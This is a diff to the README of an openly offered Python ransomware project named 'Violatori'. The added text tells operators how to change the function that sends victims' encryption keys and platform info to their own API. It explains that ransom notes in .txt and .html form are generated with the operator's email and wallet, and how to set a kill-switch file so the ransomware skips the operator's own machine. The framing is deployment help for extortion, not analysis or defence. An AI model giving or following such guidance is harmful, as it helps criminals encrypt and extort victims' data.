@@ -1,7 +1,11 @@
 # violatori
 Violatori Ransomware(Violateware) written in python
 
-you can edit send message function with your own API or other code to send key and platform info.
+you can edit send_message function with your own API or other code to send key and platform info.
+
+after the encrypt function , some .txt and .html files will be dynamically generated with unique code and the email & wallet in source code.
+
+you can edit them too.
 
 to prevent this code from running on your own system, you have to create a .txt file called "seeifexists.txt" in C:\Users\Username\
 
